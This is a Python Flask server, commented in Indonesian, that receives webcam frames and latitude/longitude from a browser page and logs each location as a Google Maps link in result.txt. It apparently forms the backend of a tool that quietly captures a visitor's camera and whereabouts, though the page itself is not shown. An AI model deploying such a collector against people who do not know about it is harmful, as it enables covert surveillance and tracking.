# safe_stream_no_display.py
# Server Flask tanpa menampilkan frame webcam di jendela lokal.
# Hanya menerima data stream dari browser untuk pembelajaran mandiri.

from flask import Flask, request, render_template_string
from datetime import datetime
import cv2
import numpy as np
import threading
import time

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 20 * 1024 * 1024  # Batas upload 20 MB

latest_frame = None  # masih simpan frame (kalau nanti mau diproses)
stop_display = False  # tidak dipakai lagi

# Tidak ada fungsi display_loop()

@app.route('/location', methods=['POST'])
def location_endpoint():
    """Terima data lokasi dari client (lat, lon) dan simpan ke result.txt."""
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    if not lat or not lon:
        return 'Invalid data', 400

    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"{ts} - https://www.google.com/maps?q={lat},{lon}\n"

    try:
        with open("result.txt", "a", encoding="utf-8") as f:
            f.write(line)
    except Exception as e:
        print("Gagal tulis lokasi:", e)
        return 'Server error', 500

    return 'OK', 200


@app.route('/')
def index():
    return render_template_string(open("streamcam.html", encoding="utf-8").read())


@app.route('/stream', methods=['POST'])
def stream_endpoint():
    """Menerima file (FormData) dengan key 'frame' (jpg blob) dari browser."""
    global latest_frame
    if 'frame' not in request.files:
        return 'No frame provided', 400

    img_file = request.files['frame']
    file_bytes = np.frombuffer(img_file.read(), np.uint8)
    frame = cv2.imdecode(file_bytes, cv2.IMREAD_COLOR)
    if frame is None:
        return 'Cannot decode frame', 400

    # simpan ke variabel global (bisa dipakai nanti untuk AI, deteksi, dll)
    latest_frame = frame
    # Tidak ditampilkan ke layar
    return '', 204


if __name__ == '__main__':
    app.run(debug=True, threaded=True)
